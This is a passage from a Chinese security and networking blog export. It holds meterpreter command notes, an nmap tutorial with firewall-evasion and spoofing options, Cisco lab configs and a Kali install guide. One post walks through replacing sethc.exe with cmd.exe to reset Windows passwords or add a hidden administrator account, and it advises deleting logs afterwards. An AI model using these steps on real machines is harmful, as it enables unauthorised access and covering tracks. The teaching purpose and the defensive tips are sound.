background                 返回，把meterpreter后台挂起
bgkill                     杀死一个背景 meterpreter 脚本
bglist                     提供所有正在运行的后台脚本的列表
bgrun                      作为一个后台线程运行脚本
channel                    显示活动频道
sessions -i number         与会话进行交互
close                      关闭通道
exit                       终止 meterpreter 会话
interact id                切换进一个信道
read                       从通道读取数据
write                      将数据写入到一个通道
2.文件系统命令
upload 本地路径 目标路径      上传文件
download 目标路径 本地路径    下载文件到本机
edit 目标路径                编辑文件
enumdesktops               用户登录数
//文件系统命令详见Linux基础命令篇</code></pre><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ol>
<li><strong>本地cmd中输入net share</strong></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--9.png" alt></p>
<p>然后有几个删几个！</p>
<pre><code>net share ipc$ /delete
net share admin$ /delete
net share c$ /delete</code></pre><ol start="2">
<li><p><strong>关闭ipc$和默认共享所依赖的:server服务</strong></p>
<p>控制面板 - 管理工具 - 服务 - server服务 - 属性 - 常规 - 启动类型 - 禁用</p>
</li>
<li><p><strong>屏蔽139，445端口</strong></p>
<p>方法很多，建议百度</p>
</li>
<li><p><strong>设置复杂的密码，防止密码被暴力破解</strong></p>
</li>
</ol>
<p>参考文献：</p>
<p><a href="https://blog.csdn.net/u010984552/article/details/54890187" target="_blank" rel="noopener">https://blog.csdn.net/u010984552/article/details/54890187</a></p>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>NMAP</title>
    <url>/2020/09/16/nmap-1/</url>
    <content><![CDATA[<blockquote>
<p>根据目标影响信息足够多TTL值在确定目标主机的操作系统系统</p>
<blockquote>
<p>   TLL是Time To live的缩写，该字段指定IP包被路由丢弃之前允许通过最大网段数量，TTL是IPv4包头的一个子list字段</p>
</blockquote>
<p>侦察足以可能影响信息的TTL值在确定目标网络的信息，从黑客的角度来看，信息收集对攻击非常有帮助.</p>
<ol>
<li>电子邮件</li>
<li>端口号</li>
<li>操作系统</li>
<li>运行的服务</li>
<li>DNS信息</li>
<li>防火墙识别和逃逸</li>
</ol>
</blockquote>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><blockquote>
<p>nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算器运行在那个操作系统</p>
</blockquote>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
<li>主机探测</li>
<li>端口扫描</li>
<li>版本检测</li>
<li>支持探测脚本的编写</li>
</ol>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul>
<li>基本快速扫描</li>
<li>Nmap默认发送一个arp的ping数据包来探测目标主机在1-10000范围内所有开放的端口</li>
</ul>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre><code>nmap [Scan Type(s)] [Options]</code></pre><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>nmap运行通常会得到被扫描主机端口的列表。nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。</p>
<p><strong>open</strong>状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。</p>
<p><strong>filtered</strong>状态表示：防火墙、包过滤和其它的<a href="http://www.itjj.net/anquan/" target="_blank" rel="noopener">网络安全</a>软件掩盖了这个端口，禁止 nmap探测其是否打开。</p>
<p><strong>unfiltered</strong>表示：这个端口关闭，并且没有防火墙/包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。</p>
<h3 id="Nmap参数详解"><a href="#Nmap参数详解" class="headerlink" title="Nmap参数详解"></a>Nmap参数详解</h3><p><strong>主机发现的一些参数</strong></p>
<h4 id="sP-Ping扫描"><a href="#sP-Ping扫描" class="headerlink" title="-sP(Ping扫描)"></a>-sP(Ping扫描)</h4><p>该选项告诉Nmap仅仅 进行ping扫描 (主机发现)，-sP选项在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口</p>
<h4 id="P0-无ping"><a href="#P0-无ping" class="headerlink" title="-P0 (无ping)"></a>-P0 (无ping)</h4><p>用-P0禁止 主机发现会使Nmap对每一个指定的目标IP地址 进行所要求的扫描。所以如果在命令行指定一?个B类目标地址空间(/16)， 所有 65,536 个IP地址都会被扫描</p>
<h4 id="PS-portlist-TCP-SYN-Ping"><a href="#PS-portlist-TCP-SYN-Ping" class="headerlink" title="-PS [portlist] (TCP SYN Ping)"></a>-PS [portlist] (TCP SYN Ping)</h4><p>该选项发送一个设置了SYN标志位的空TCP报文，SYN标志位告诉对方您正试图建立一个连接。 通常目标端口是关闭的，一个RST (复位) 包会发回来。<br>如果碰巧端口是开放的，目标会进行TCP三步握手的第二步，回应 一个SYN/ACK TCP报文。然后运行Nmap的机器则会扼杀这个正在建立的连接，<br>发送一个RST而非ACK报文，否则，一个完全的连接将会建立。 RST报文是运行Nmap的机器而不是Nmap本身响应的，因为它对收到的SYN/ACK感到很意外。</p>
<h4 id="PA-portlist-TCP-ACK-Ping"><a href="#PA-portlist-TCP-ACK-Ping" class="headerlink" title="-PA [portlist] (TCP ACK Ping)"></a>-PA [portlist] (TCP ACK Ping)</h4><p>TCP ACK ping和刚才讨论的SYN ping相当类似。 也许您已经猜到了，区别就是设置TCP的ACK标志位而不是SYN标志位。<br> ACK报文表示确认一个建立连接的尝试，但该连接尚未完全建立。 所以远程主机应该总是回应一个RST报文，<br> 因为它们并没有发出过连接请求到运行Nmap的机器，如果它们正在运行的话。</p>
<p>提供SYN和ACK两种ping探测的原因是使通过防火墙的机会尽可能大。 许多管理员会配置他们的路由器或者其它简单的防火墙来封锁SYN报文，<br>除非 连接目标是那些公开的服务器像公司网站或者邮件服务器。 这可以阻止其它进入组织的连接，同时也允许用户访问互联网。<br>这种无状态的方法几乎不占用防火墙/路由器的资源，因而被硬件和软件过滤器 广泛支持。Linux的Netfilter/iptables 防火墙软件提供方便的<br>–syn选项来实现这种无状态的方法。 当这样的无状态防火墙规则存在时，发送到关闭目标端口的SYNping探测 (-PS) 很可能被封锁。<br>这种情况下，ACK探测格外有闪光点，因为它正好利用了 这样的规则。</p>
<h4 id="PU-portlist-UDP-Ping"><a href="#PU-portlist-UDP-Ping" class="headerlink" title="-PU [portlist] (UDP Ping)"></a>-PU [portlist] (UDP Ping)</h4><p>还有一个主机发现的选项是UDP ping，它发送一个空的(除非指定了–data-length UDP报文到给定的端口。如果目标机器的端口是关闭的，UDP探测应该马上得到一个ICMP端口无法到达的回应报文。<br>这对于Nmap意味着该机器正在运行。 许多其它类型的ICMP错误，像主机/网络无法到达或者TTL超时则表示down掉的或者不可到达的主机。<br>没有回应也被这样解释。如果到达一个开放的端口，大部分服务仅仅忽略这个 空报文而不做任何回应。</p>
<p>该扫描类型的主要优势是它可以穿越只过滤TCP的防火墙和过滤器</p>
<h4 id="PR-ARP-Ping"><a href="#PR-ARP-Ping" class="headerlink" title="-PR (ARP Ping)"></a>-PR (ARP Ping)</h4><p>最常见的Nmap使用场景之一是扫描一个以太局域网，</p>
<h4 id="sS-TCP-SYN扫描"><a href="#sS-TCP-SYN扫描" class="headerlink" title="-sS (TCP SYN扫描)"></a>-sS (TCP SYN扫描)</h4><p>SYN扫描作为默认的也是最受欢迎的扫描选项，是有充分理由的。 它执行得很快，在一个没有入侵防火墙的快速网络上，每秒钟可以扫描数千个 端口。SYN扫描相对来说不张扬，不易被注意到，因为它从来不完成TCP连接。它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。如果数次重发后仍没响应， 该端口就被标记为被过滤。</p>
<h4 id="sT-TCP-connect-扫描"><a href="#sT-TCP-connect-扫描" class="headerlink" title="-sT (TCP connect()扫描)"></a>-sT (TCP connect()扫描)</h4><p>当SYN扫描不能用时，CP Connect()扫描就是默认的TCP扫描</p>
<h4 id="sU-UDP扫描"><a href="#sU-UDP扫描" class="headerlink" title="-sU (UDP扫描)"></a>-sU (UDP扫描)</h4><p>虽然互联网上很多流行的服务运行在TCP 协议上，UDP[5]服务也不少。?DNS，SNMP，和DHCP (注册的端口是53，161/162，和67/68)是最常见的三个。<br> 因为UDP扫描一般较慢，比TCP更困难，一些安全审核人员忽略这些端口。 这是一个错误，因为可探测的UDP服务相当普遍，攻击者当然不会忽略整个协议。 所幸，Nmap可以帮助记录并报告UDP端口。</p>
<p>UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)，<br>该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的)。<br>偶尔地，某服务会响应一个UDP报文，证明该端口是open(开放的)。如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。<br>这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。 可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。</p>
<h4 id="sV-版本探测"><a href="#sV-版本探测" class="headerlink" title="-sV (版本探测)"></a>-sV (版本探测)</h4><p>打开版本探测。 您也可以用-A同时打开操作系统探测和版本探测。</p>
<h4 id="O-启用操作系统检测"><a href="#O-启用操作系统检测" class="headerlink" title="-O (启用操作系统检测)"></a>-O (启用操作系统检测)</h4><p>防火墙/IDS躲避和哄骗<br>?-f (报文分段); –mtu (使用指定的MTU)<br>-f选项要求扫描时(包挺ping扫描)使用 小的IP包分段。其思路是将TCP头分段在几个包中，使得包过滤器、 IDS以及其它工具的检测更加困难。<br>必须小心使用这个选项，有些系统在处理这些小包时存在问题。</p>
<h4 id="D-lt-decoy1-，decoy2-，ME-，…-gt-使用诱饵隐蔽扫描"><a href="#D-lt-decoy1-，decoy2-，ME-，…-gt-使用诱饵隐蔽扫描" class="headerlink" title="?-D &lt;decoy1 [，decoy2][，ME]，…&gt; (使用诱饵隐蔽扫描)"></a>?-D &lt;decoy1 [，decoy2][，ME]，…&gt; (使用诱饵隐蔽扫描)</h4><p>注意，作为诱饵的主机须在工作状态，否则会导致目标主机的SYN洪水攻击</p>
<h4 id="S-源地址哄骗"><a href="#S-源地址哄骗" class="headerlink" title="-S  (源地址哄骗)"></a>-S <IP_Address> (源地址哄骗)</IP_Address></h4><p>在某些情况下，Nmap可能无法确定你的源地址(如果这样，Nmap会给出提示)。此时，使用-S选项并说明所需发送包的接口IP地址。<br>这个标志的另一个用处是哄骗性的扫描，使得目标认为是另 一个地址在进行扫描。可以想象某一个竞争对手在不断扫描某个公司！<br>-e选项常在这种情况下使用，也可采用-P0选项。</p>
<h4 id="sF-sX-sN-秘密FIN数据包扫描、圣诞树-Xmas-Tree-、空-Null-扫描模式"><a href="#sF-sX-sN-秘密FIN数据包扫描、圣诞树-Xmas-Tree-、空-Null-扫描模式" class="headerlink" title="-sF -sX -sN(秘密FIN数据包扫描、圣诞树(Xmas Tree)、空(Null)扫描模式)"></a>-sF -sX -sN(秘密FIN数据包扫描、圣诞树(Xmas Tree)、空(Null)扫描模式)</h4><p>　　<strong>秘密FIN数据包扫描、圣诞树(Xmas Tree)、空(Null)扫描模式：</strong>即使SYN扫描都无法确定的情况下使用。一些防火墙和包过滤软件能够对发送到被限制端口的SYN数据包进行监视，而且有些程序比如synlogger和courtney能够检测那些扫描。这些高级的扫描方式可以逃过这些干扰。这些扫描方式的理论依据是：关闭的端口需要对你的探测包回应RST包，而打开的端口必需忽略有问题的包(参考RFC 793第64页)。FIN扫描使用暴露的FIN数据包来探测，而圣诞树扫描打开数据包的FIN、URG和PUSH标志。不幸的是，微软决定完全忽略这个标准，另起炉灶。所以这种扫描方式对Windows95/NT无效。不过，从另外的角度讲，可以使用这种方式来分别两种不同的平台。如果使用这种扫描方式可以发现打开的端口，你就可以确定目标主机运行的不是Windows系统。如果使用-sF、-sX或者-sN扫描显示所有的端口都是关闭的，而使用SYN扫描显示有打开的端口，你可以确定目标主机可能运行的是Windwos系统。现在这种方式没有什么太大的用处，因为nmap有内嵌的<a href="http://www.itjj.net/OS/" target="_blank" rel="noopener">操作系统</a>检测功能。还有其它几个系统使用和windows同样的处理方式，包括Cisco、BSDI、HP/UX、MYS、IRIX。在应该抛弃数据包时，以上这些系统都会从打开的端口发出复位数据包。</p>
<h4 id="sA-ACK扫描"><a href="#sA-ACK扫描" class="headerlink" title="-sA(ACK扫描)"></a>-sA(ACK扫描)</h4><p>ACK扫描：这项高级的扫描方法通常用来穿过防火墙的规则集。通常情况下，这有助于确定一个防火墙是功能比较完善的或者是一个简单的包过滤程序，只是阻塞进入的SYN包。<br>这种扫描是向特定的端口发送ACK包(使用随机的应答/序列号)。如果返回一个RST包，这个端口就标记为unfiltered状态。如果什么都没有返回，或者返回一个不可达ICMP消息，这个端口就归入filtered类。注意，nmap通常不输出unfiltered的端口，所以在输出中通常不显示所有被探测的端口。显然，这种扫描方式不能找出处于打开状态的端口。</p>
<h3 id="Nmap图形界面——zenmap"><a href="#Nmap图形界面——zenmap" class="headerlink" title="Nmap图形界面——zenmap"></a>Nmap图形界面——zenmap</h3><ul>
<li>基于windows的nmap图形化zenmap的参数及用法，与基于Liunx和nmap完全相同</li>
<li>nmap在windows平台上运行时，需要用到winpcap程序支持运行</li>
</ul>
<h3 id="Nmap优缺点"><a href="#Nmap优缺点" class="headerlink" title="Nmap优缺点"></a>Nmap优缺点</h3><ul>
<li><strong>优点</strong></li>
</ul>
<p>nmap作为主动式端口扫描工具，只要在对方设有发有通信阻断的情况下，可以在较短的时间内获得结果</p>
<ul>
<li><strong>缺点</strong></li>
</ul>
<p>（1）现在常有阻断功能的防火墙越来越多，有些防火墙当检测到端口扫描时，会将端口关闭一段时间，还有的机器使用了filter功能，只对特定的IP地址提供服务，这种情况下，主动式的准确性大打折扣</p>
<p>（2）主动式只是在一瞬间对端口进行扫描，只有当服务器那个时候使用的服务器才可以被侦听到。</p>
<p>（3）端口扫描是一种广义上的攻击行为，对未经许可的机器，一般不能施行</p>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>笔记</tag>
        <tag>网安网安笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>静态路由</title>
    <url>/2020/06/26/route/</url>
    <content><![CDATA[<h1 id="网络搭建—静态路由"><a href="#网络搭建—静态路由" class="headerlink" title="网络搭建—静态路由"></a>网络搭建—静态路由</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
</blockquote>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r1-1.png" alt></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R0</p>
<pre><code>en
config
int f0/0
no shutdown
ip add 192.168.1.1 255.255.255.0
int s0/0/0
no shutdown
ip add 192.168.3.1 255.255.255.0
exit
ip routing
ip route 192.168.4.0 255.255.255.0 192.168.3.2
ip route 192.168.2.0 255.255.255.0 192.168.3.2</code></pre><p>R1</p>
<pre><code>en
config
int s0/0/0
no shutdown
ip add 192.168.3.2 255.255.255.0
int s0/0/1
no shutdown
ip add 192.168.4.2 255.255.255.0
exit
ip routing
ip route 192.168.1.0 255.255.255.0 192.168.3.1
ip route 192.168.2.0 255.255.255.0 192.168.4.1</code></pre><p>R2</p>
<pre><code>en
config
int s0/0/0
no shutdown
ip add 192.168.4.1 255.255.255.0
int f0/0
no shutdown
ip add 192.168.2.1 255.255.255.0
exit
ip routing
ip route 192.168.1.0 255.255.255.0 192.168.4.2
ip route 192.168.3.0 255.255.255.0 192.168.4.2</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/r1-2.png" alt></p>
]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>5次shift漏洞破解系统密码</title>
    <url>/2020/06/28/shift/</url>
    <content><![CDATA[<h1 id="利用5次shift漏洞破解系统密码"><a href="#利用5次shift漏洞破解系统密码" class="headerlink" title="利用5次shift漏洞破解系统密码"></a>利用5次shift漏洞破解系统密码</h1><h2 id="Windows-五次shift键破解密码"><a href="#Windows-五次shift键破解密码" class="headerlink" title="Windows   五次shift键破解密码"></a>Windows   五次shift键破解密码</h2><p>原理：系统登录界面时五次按下shift键会弹出 - 粘滞键菜单   找到对应路径<strong>掉包成CMD即可</strong></p>
<p>部分win7和win10可以利用系统修复功能来篡改系统文件名</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200628183502.png" alt></p>
<p><strong>具体步骤：</strong></p>
<ol>
<li><p>开机出现windows启动界面时强制关机</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200628183544.png" alt></p>
</li>
<li><p>再次开机，选择“启动修复”选项</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200628183614.png" alt></p>
</li>
<li><p>等待系统进行扫描，在系统还原选项点击<strong>“取消”</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200628183631.png" alt></p>
</li>
<li><p>到这个界面时，点击”隐藏问题详细信息“</p>
<p><strong>打开最下面的超链接</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200628183657.png" alt></p>
</li>
<li><p>这里就会弹出操作系统的错误报告，我们只需要点击右上角的</p>
<p><strong>文件 - 打开</strong>  <strong>然后顺藤摸瓜   摸到C盘目录</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200628183728.png" alt></p>
<blockquote>
<p>这一步只是利用弹出的记事本摸到C盘，跟记事本的内容毫无关联</p>
</blockquote>
</li>
<li><p><strong>开始掉包！</strong></p>
<p><strong>先到C:\windows\system32目录</strong></p>
<p>这里 <strong>粘滞键菜单</strong> 是 <strong>sethc</strong> （这里的路径是隐藏扩展名的）</p>
<p>重命名：随便打</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200628183748.png" alt></p>
<p><strong>接着找到CMD，将CMD复制一份并命名为setch</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200629090725.png" alt></p>
<p>OK，掉包成功！重启计算机！</p>
<p>重启之后连按5次shift后弹出的不是<strong>粘滞键菜单</strong>，而是<strong>cmd！</strong></p>
<blockquote>
<p><strong>方法1：</strong></p>
<p>net user 用户名 新密码</p>
<p>缺点：会被发现</p>
<p><strong>方法2：</strong></p>
<p>net user 新用户 密码 /add</p>
<p>net localgroup administrators 新用户 /add</p>
<p>创建一个新用户   并添加到超级管理员用户组</p>
<p>PS:操作完之后需要删除用户和日志   毁尸灭迹</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200629090805.png" alt></p>
<p><strong>然后就可以用新用户登录了</strong>！</p>
</li>
</ol>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p><strong>升级到最新windows版本即可</strong></p>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>收录</tag>
      </tags>
  </entry>
  <entry>
    <title>交换机端口镜像</title>
    <url>/2020/07/15/sw-1/</url>
    <content><![CDATA[<h1 id="网络搭建—交换机端口镜像"><a href="#网络搭建—交换机端口镜像" class="headerlink" title="网络搭建—交换机端口镜像"></a>网络搭建—交换机端口镜像</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
<p>目标：把端口f0/1的流量镜像到端口f0/3</p>
</blockquote>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715195002.png" alt></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>SW</p>
<pre><code>en
config
MOnitor Session 1 Source Interface F0/1 Both
MOnitor Session 1 Destination Interface F0/3</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715195503.png" alt><br><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715195651.png" alt><br><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715195701.png" alt><br><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715195711.png" alt><br><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715195748.png" alt></p>
]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>交换机端口与MAC绑定</title>
    <url>/2020/07/15/sw-2/</url>
    <content><![CDATA[<h1 id="网络搭建—交换机端口与MAC绑定"><a href="#网络搭建—交换机端口与MAC绑定" class="headerlink" title="网络搭建—交换机端口与MAC绑定"></a>网络搭建—交换机端口与MAC绑定</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
<p>目标：将端口f0/1和其所连接PC的MAC地址进行绑定</p>
</blockquote>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715202544.png" alt></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>交换机</p>
<pre><code>en
config
sw mode access
switchport port-security
switchport port-security mac-address 0001.96D9.8752</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><strong>MAC地址修改前</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715202727.png" alt></p>
<p><strong>MAC地址修改后</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715202914.png" alt></p>
]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装</title>
    <url>/2020/06/23/kali-install-1/</url>
    <content><![CDATA[<blockquote>
<p>自从Hexo基本搭建完成后，不知道写些什么，所以咕咕咕了个10几天。<br>想了想，先从网安开始吧，后续再写几篇网络搭建的。</p>
</blockquote>
<h1 id="Kali安装"><a href="#Kali安装" class="headerlink" title="Kali安装"></a>Kali安装</h1><ul>
<li>镜像我用的是 2019.3</li>
<li>VMware 15</li>
<li>多图警告，可能加载比较慢</li>
</ul>
<hr>
<pre><code>开始安装</code></pre><hr>
<p>新建虚拟机</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-1.png" alt></p>
<p>把镜像路径选好</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-2.png" alt></p>
<p>把操作系统选好</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-3.png" alt></p>
<p>虚拟机名字随意，虚拟机路径最好不要选在C盘</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-4.png" alt></p>
<p>磁盘大小调到30G</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-5.png" alt></p>
<p>点击 <code>自定义硬件</code> </p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-6.png" alt></p>
<p>虚拟机内核和内存分配好，把网络适配器改成 <code>桥接模式 (自动)</code></p>
<blockquote>
<p>最好把配置调高点，不然Kali用起来会比较卡</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-7.png" alt></p>
<p>点击<code>完成</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-8.png" alt></p>
<p>点击 <code>开启此虚拟机</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-9.png" alt></p>
<p>开启虚拟机之后，用<code>↓</code>键选中 <code>Graphical install</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-10.png" alt></p>
<p>选中<code>中文（简体）</code> 然后点击 <code>Continue</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-11.png" alt></p>
<p>之后一路点 <code>继续</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-13.png" alt></p>
<p>主机名随意，默认 的<code>kali</code>也可以</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-14.png" alt></p>
<p>域名留空即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1161.png" alt></p>
<p>设置好root密码，然后继续</p>
<blockquote>
<p>习惯小键盘输入的，记得按一下<code>NumLock</code>键哦</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-17.png" alt></p>
<p>选中<code>使用整个磁盘</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-18.jpg" alt></p>
<p>之后一路<code>继续</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-19.png" alt></p>
<p>选中<code>是</code>，然后点击<code>继续</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-20.png" alt></p>
<p>之后就开始安装了</p>
<blockquote>
<p>我安装在机械盘，大约需要15分钟</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-22.png" alt></p>
<p>选中 <code>否</code>，然后点击<code>继续</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-24.png" alt></p>
<p>安装GRUB，选<code>是</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-25.png" alt></p>
